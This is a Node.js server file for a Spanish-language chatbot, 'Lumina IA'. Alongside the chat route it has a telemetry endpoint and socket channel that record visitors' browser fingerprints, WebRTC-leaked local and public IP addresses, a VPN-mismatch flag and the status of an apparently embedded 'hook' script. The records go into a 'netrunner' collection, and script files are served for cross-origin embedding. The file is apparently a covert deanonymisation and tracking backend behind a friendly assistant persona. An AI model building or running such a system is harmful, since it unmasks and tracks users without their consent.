import 'dotenv/config';
import express from 'express';
import { createServer } from 'http';
import { Server as SocketIOServer } from 'socket.io';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import mongoose from 'mongoose';

const PORT = Number(process.env.PORT) || 8080;
const HOST = '0.0.0.0';
const MONGO_URL = process.env.MONGO_URL;

const TELEMETRY_BATCH_SIZE = 64;
const TELEMETRY_FLUSH_MS = 120;
const MAX_TELEMETRY_QUEUE = 5000;

const app = express();
const httpServer = createServer(app);

const bridgeLogPath = path.join(process.cwd(), 'bridge_status.log');
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const publicPath = path.join(__dirname, 'public');

function writeBridgeLog(level, ...args) {
    try {
        const message = args.map((arg) => {
            if (typeof arg === 'string') return arg;
            try {
                return JSON.stringify(arg);
            } catch {
                return String(arg);
            }
        }).join(' ');
        fs.appendFileSync(bridgeLogPath, `[${new Date().toISOString()}] [${level}] ${message}\n`);
    } catch {
        // Never crash process because of logging I/O.
    }
}

const originalConsoleLog = console.log.bind(console);
const originalConsoleWarn = console.warn.bind(console);
const originalConsoleError = console.error.bind(console);
console.log = (...args) => { writeBridgeLog('INFO', ...args); originalConsoleLog(...args); };
console.warn = (...args) => { writeBridgeLog('WARN', ...args); originalConsoleWarn(...args); };
console.error = (...args) => { writeBridgeLog('ERROR', ...args); originalConsoleError(...args); };

const io = new SocketIOServer(httpServer, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    }
});

const nodeSocketMap = {};

const nodeProfileSchema = new mongoose.Schema({
    nodeId: { type: String, required: true, index: true },
    sessionId: { type: String, required: true, index: true },
    profileCategory: { type: String, enum: ['Mobile', 'Tablet', 'Desktop'], index: true, default: 'Desktop' },
    source: { type: String, default: 'web_client' },
    userAgent: String,
    acceptedLanguage: String,
    serverObservedIp: String,
    headerIp: String,
    telemetry: {
        fingerprint: {
            hardwareConcurrency: Number,
            deviceMemory: Number,
            webglVendor: String,
            webglRenderer: String,
            canvasHash: String,
            stableFingerprint: String
        },
        network: {
            localIps: [String],
            publicIps: [String],
            candidateIps: [String],
            srflxIps: [String],
            localDescription: String,
            sdpCandidates: [String],
            vpnMismatch: Boolean,
            mismatchReason: String
        },
        hook: {
            loaded: Boolean,
            endpoint: String,
            status: String,
            detail: String
        },
        page: {
            href: String,
            visibilityState: String,
            timezone: String,
            viewportWidth: Number,
            viewportHeight: Number,
            screenWidth: Number,
            screenHeight: Number
        }
    },
    receivedAt: { type: Date, default: Date.now, index: true },
    lastSeen: { type: Date, default: Date.now, index: true }
}, {
    timestamps: true,
    collection: 'netrunner'
});

nodeProfileSchema.index({ nodeId: 1, sessionId: 1 }, { unique: true });

const NodeProfile = mongoose.model('NodeProfile', nodeProfileSchema);

const telemetryQueue = [];
let flushTimer = null;
let flushInProgress = false;

function truncate(value, max = 8192) {
    return String(value || '').slice(0, max);
}

function sanitizeObject(input) {
    return input && typeof input === 'object' && !Array.isArray(input) ? input : {};
}

function sanitizeInteger(input, fallback = 0) {
    const value = Number(input);
    return Number.isFinite(value) ? Math.trunc(value) : fallback;
}

function sanitizeIpList(input, maxItems, maxLen = 64) {
    if (!Array.isArray(input)) return [];
    return input
        .slice(0, maxItems)
        .map((item) => truncate(item, maxLen).trim())
        .filter(Boolean);
}

function sanitizeTelemetry(input = {}) {
    const telemetry = sanitizeObject(input);
    const fingerprint = sanitizeObject(telemetry.fingerprint);
    const network = sanitizeObject(telemetry.network);
    const hook = sanitizeObject(telemetry.hook);
    const page = sanitizeObject(telemetry.page);

    return {
        fingerprint: {
            hardwareConcurrency: sanitizeInteger(fingerprint.hardwareConcurrency, undefined),
            deviceMemory: sanitizeInteger(fingerprint.deviceMemory, undefined),
            webglVendor: truncate(fingerprint.webglVendor || '', 256),
            webglRenderer: truncate(fingerprint.webglRenderer || '', 256),
            canvasHash: truncate(fingerprint.canvasHash || '', 256),
            stableFingerprint: truncate(fingerprint.stableFingerprint || '', 256)
        },
        network: {
            localIps: sanitizeIpList(network.localIps, 32),
            publicIps: sanitizeIpList(network.publicIps, 32),
            candidateIps: sanitizeIpList(network.candidateIps, 64),
            srflxIps: sanitizeIpList(network.srflxIps, 32),
            localDescription: truncate(network.localDescription || '', 8192),
            sdpCandidates: sanitizeIpList(network.sdpCandidates, 128, 512),
            vpnMismatch: Boolean(network.vpnMismatch),
            mismatchReason: truncate(network.mismatchReason || '', 128)
        },
        hook: {
            loaded: Boolean(hook.loaded),
            endpoint: truncate(hook.endpoint || '', 512),
            status: truncate(hook.status || 'unknown', 64),
            detail: truncate(hook.detail || '', 256)
        },
        page: {
            href: truncate(page.href || '', 512),
            visibilityState: truncate(page.visibilityState || '', 32),
            timezone: truncate(page.timezone || '', 64),
            viewportWidth: sanitizeInteger(page.viewportWidth),
            viewportHeight: sanitizeInteger(page.viewportHeight),
            screenWidth: sanitizeInteger(page.screenWidth),
            screenHeight: sanitizeInteger(page.screenHeight)
        }
    };
}

function parseAiErrorText(aiData) {
    return truncate(aiData?.error?.message || aiData?.message || aiData?.error || '', 1024);
}

function isRateLimitOrQuotaError(status, aiData) {
    const text = parseAiErrorText(aiData).toLowerCase();
    return status === 429 || status === 503 || text.includes('rate limit') || text.includes('quota') || text.includes('insufficient_quota');
}

function buildAiProviders(requestedModel) {
    const providers = [];

    if (process.env.GROQ_API_KEY) {
        const validGroqModels = new Set([
            'llama-3.3-70b-versatile',
            'llama-3.1-70b-versatile',
            'llama-3.1-8b-instant',
            'mixtral-8x7b-32768',
            'llama3-70b-8192',
            'llama3-8b-8192'
        ]);
        const cleanModel = truncate(requestedModel || '', 128).replace(/^groq:/, '');
        providers.push({
            name: 'groq',
            apiKey: process.env.GROQ_API_KEY,
            apiUrl: 'https://api.groq.com/openai/v1/chat/completions',
            model: validGroqModels.has(cleanModel) ? cleanModel : 'llama-3.1-8b-instant'
        });
    }

    if (process.env.OPENCODE_ZEN_API_KEY) {
        const cleanModel = truncate(requestedModel || '', 128).replace(/^opencodezen:/, '') || 'opencodezen-free-model';
        providers.push({
            name: 'opencodezen',
            apiKey: process.env.OPENCODE_ZEN_API_KEY,
            apiUrl: 'https://api.opencodezen.com/v1/chat/completions',
            model: cleanModel
        });
    }

    return providers;
}

function classifyProfileCategory(userAgent = '', page = {}) {
    const ua = String(userAgent).toLowerCase();
    const viewportWidth = Number(page?.viewportWidth) || 0;
    const screenWidth = Number(page?.screenWidth) || 0;
    const inferredWidth = Math.max(viewportWidth, screenWidth);

    const isTabletUa = /ipad|tablet|playbook|silk/.test(ua) || (/android/.test(ua) && !/mobile/.test(ua));
    const isMobileUa = /mobi|iphone|ipod|android.*mobile|windows phone/.test(ua);

    if (isTabletUa) return 'Tablet';
    if (isMobileUa) return 'Mobile';
    if (inferredWidth > 0 && inferredWidth <= 900) return 'Mobile';
    if (inferredWidth > 900 && inferredWidth <= 1200) return 'Tablet';
    return 'Desktop';
}

function enqueueTelemetryWrite(filter, payload) {
    if (telemetryQueue.length >= MAX_TELEMETRY_QUEUE) {
        return Promise.reject(new Error('Telemetry queue is full'));
    }

    return new Promise((resolve, reject) => {
        telemetryQueue.push({ filter, payload, resolve, reject });
        scheduleTelemetryFlush();
    });
}

function scheduleTelemetryFlush() {
    if (flushTimer) return;
    flushTimer = setTimeout(() => {
        flushTimer = null;
        flushTelemetryQueue().catch((error) => {
            console.error('Telemetry queue flush error:', error.message);
        });
    }, TELEMETRY_FLUSH_MS);
}

async function flushTelemetryQueue() {
    if (flushInProgress) return;
    if (mongoose.connection.readyState !== 1) return;

    flushInProgress = true;
    try {
        while (telemetryQueue.length > 0) {
            const batch = telemetryQueue.splice(0, TELEMETRY_BATCH_SIZE);
            const operations = batch.map((entry) => ({
                updateOne: {
                    filter: entry.filter,
                    update: {
                        $set: entry.payload,
                        $setOnInsert: { createdAt: new Date() }
                    },
                    upsert: true
                }
            }));
            try {
                await NodeProfile.bulkWrite(operations, { ordered: false });
                batch.forEach((entry) => entry.resolve());
            } catch (error) {
                batch.forEach((entry) => entry.reject(error));
            }
        }
    } finally {
        flushInProgress = false;
        if (telemetryQueue.length > 0) {
            scheduleTelemetryFlush();
        }
    }
}

async function connectMongo() {
    if (!MONGO_URL) {
        console.warn('⚠️ MONGO_URL not provided. MongoDB connection will not be established.');
        return;
    }

    try {
        await mongoose.connect(MONGO_URL);
        console.log('💾 MongoDB Connected (Mongoose).');
    } catch (error) {
        console.error('❌ MongoDB Connection Failed:', error.message);
    }
}

app.use(express.json({ limit: '2mb' }));
app.use('/public', express.static(publicPath, {
    maxAge: '5m',
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.js')) {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
        }
    }
}));
app.use(express.static(publicPath, { maxAge: '5m' }));

app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

app.post('/api/chat', async (req, res) => {
    const body = sanitizeObject(req.body);
    const providers = buildAiProviders(body.model);
    const inputMessages = Array.isArray(body.messages) ? body.messages : [];

    if (!providers.length) {
        return res.status(500).json({ error: 'No AI API key configured on the server.' });
    }

    try {
        const fetch = (await import('node-fetch')).default;
        let lastFailure = null;

        for (const provider of providers) {
            const aiResponse = await fetch(provider.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${provider.apiKey}`
                },
                body: JSON.stringify({
                    model: provider.model,
                    messages: [
                        {
                            role: 'system',
                            content: 'Eres Lumina IA, un asistente cálido y servicial. Usa un lenguaje sencillo, ayuda a organizar el día, redactar correos y responder dudas generales con claridad. Responde en español salvo que te pidan otro idioma.'
                        },
                        ...inputMessages
                    ],
                    temperature: 0.5
                })
            });

            const aiData = await aiResponse.json().catch(() => ({}));
            if (aiResponse.ok) {
                return res.json({
                    text: aiData.choices?.[0]?.message?.content || '',
                    provider: provider.name,
                    model: provider.model
                });
            }

            const fallbackAvailable = providers.length > 1 && provider !== providers[providers.length - 1];
            const shouldFallback = fallbackAvailable && isRateLimitOrQuotaError(aiResponse.status, aiData);

            lastFailure = {
                status: aiResponse.status,
                provider: provider.name,
                model: provider.model,
                details: aiData
            };

            if (!shouldFallback) {
                return res.status(aiResponse.status).json({
                    error: parseAiErrorText(aiData) || `Error from external AI API (${provider.model})`,
                    provider: provider.name,
                    model: provider.model,
                    details: aiData
                });
            }

            console.warn(`Provider ${provider.name} rate-limited/quota exhausted. Trying next provider.`);
        }

        return res.status(lastFailure?.status || 429).json({
            error: 'All configured AI providers are temporarily unavailable due to rate limits/quota.',
            attemptedProviders: providers.map((provider) => provider.name),
            details: lastFailure?.details || {}
        });
    } catch (error) {
        return res.status(500).json({ error: `Failed to communicate with AI API: ${error.message}` });
    }
});

app.post('/api/telemetry', async (req, res) => {
    const body = sanitizeObject(req.body);
    const nodeId = truncate(body.nodeId, 128).trim();
    const sessionId = truncate(body.sessionId, 128).trim();

    if (!nodeId || !sessionId) {
        return res.status(400).json({ error: 'nodeId and sessionId are required.' });
    }

    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ error: 'Telemetry storage temporarily unavailable.' });
    }

    const xff = req.headers['x-forwarded-for'];
    const headerIp = Array.isArray(xff) ? xff[0] : (typeof xff === 'string' ? xff.split(',')[0].trim() : '');
    const serverObservedIp = req.ip || req.socket?.remoteAddress || '';

    const telemetry = sanitizeTelemetry(body.telemetry);
    const page = telemetry.page;
    const userAgent = req.get('user-agent') || body.userAgent || '';
    const profileCategory = classifyProfileCategory(userAgent, page);

    const payload = {
        nodeId,
        sessionId,
        profileCategory,
        source: truncate(body.source || 'web_client', 64),
        userAgent: truncate(userAgent, 512),
        acceptedLanguage: truncate(req.get('accept-language') || '', 128),
        serverObservedIp: truncate(serverObservedIp, 64),
        headerIp: truncate(headerIp, 64),
        telemetry,
        receivedAt: new Date(),
        lastSeen: new Date()
    };

    try {
        await enqueueTelemetryWrite({ nodeId, sessionId }, payload);
        return res.json({
            ok: true,
            nodeId,
            sessionId,
            profileCategory,
            queueDepth: telemetryQueue.length,
            serverObservedIp: payload.serverObservedIp,
            headerIp: payload.headerIp
        });
    } catch (error) {
        if (error.message === 'Telemetry queue is full') {
            return res.status(429).json({ error: 'Telemetry queue overflow. Retry later.' });
        }
        return res.status(500).json({ error: 'Failed to persist telemetry.' });
    }
});

io.on('connection', (socket) => {
    socket.on('register_node', (data = {}) => {
        const nodeId = data.nodeId;
        if (!nodeId) return;

        nodeSocketMap[nodeId] = socket.id;
        socket.data.nodeId = nodeId;

        socket.emit('vincular_confirmado', {
            nodeId,
            nodeRuntime: data.nodeRuntime || 'web_client',
            nodeChannel: data.nodeChannel || 'passive_monitor'
        });
    });

    socket.on('node_report', async (data = {}) => {
        if (!data.nodeId || mongoose.connection.readyState !== 1) return;

        const telemetry = sanitizeTelemetry(data.telemetry);
        const page = telemetry.page;
        const userAgent = data.userAgent || '';
        const profileCategory = classifyProfileCategory(userAgent, page);

        const payload = {
            nodeId: data.nodeId,
            sessionId: data.sessionId || 'socket-session',
            source: data.source || 'socket',
            profileCategory,
            userAgent: truncate(userAgent, 512),
            telemetry,
            lastSeen: new Date(),
            receivedAt: new Date()
        };

        enqueueTelemetryWrite({ nodeId: payload.nodeId, sessionId: payload.sessionId }, payload).catch(() => {});
    });

    socket.on('disconnect', () => {
        const nodeId = socket.data?.nodeId;
        if (nodeId && nodeSocketMap[nodeId] === socket.id) {
            delete nodeSocketMap[nodeId];
        }
    });
});

async function startServer() {
    await connectMongo();

    httpServer.listen(PORT, HOST, () => {
        const address = httpServer.address();
        const boundHost = address && typeof address === 'object' ? address.address : HOST;
        const boundPort = address && typeof address === 'object' ? address.port : PORT;
        console.log(`🚀 SystemBridge listening on ${boundHost}:${boundPort}`);
        console.log(`Socket.io listening on ${boundHost}:${boundPort}`);
    });
}

startServer();

let shutdownStarted = false;
async function gracefulShutdown(signal) {
    if (shutdownStarted) return;
    shutdownStarted = true;
    console.log(`Received ${signal}. Starting graceful shutdown...`);

    await new Promise((resolve) => {
        httpServer.close(() => resolve());
    }).catch(() => {});

    if (mongoose.connection.readyState !== 0) {
        try {
            await mongoose.connection.close();
            console.log('MongoDB connection closed (Mongoose).');
        } catch (error) {
            console.error('Error while closing MongoDB connection:', error.message);
        }
    }

    process.exit(0);
}

process.on('SIGTERM', () => {
    gracefulShutdown('SIGTERM').catch((error) => {
        console.error('Graceful shutdown failed:', error.message);
        process.exit(1);
    });
});

process.on('SIGINT', () => {
    gracefulShutdown('SIGINT').catch((error) => {
        console.error('Graceful shutdown failed:', error.message);
        process.exit(1);
    });
});
